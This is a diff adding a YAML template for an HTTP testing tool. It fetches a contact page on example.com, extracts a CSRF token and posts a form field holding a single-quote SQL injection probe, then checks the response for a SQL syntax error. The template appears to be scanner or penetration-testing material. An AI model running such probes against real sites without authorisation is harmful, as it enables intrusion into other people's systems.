@@ -1,0 +1,19 @@
+name: csrf_token
+description: get csrf token to bypass CSRF check
+module: http
+parameter:
+    url: http://example.com/contact
+    method: GET
+    extract:
+        csrf: [CSS, "#csrf"]
+---
+name: exploit
+description: exploit with csrf token
+module: http
+parameter:
+    url: http://example.com/contact
+    method: POST
+    body:
+        name: "'INJECTION"
+        csrf: "{{csrf_token.extracted.csrf}}"
+    find: You have an error in your SQL syntax
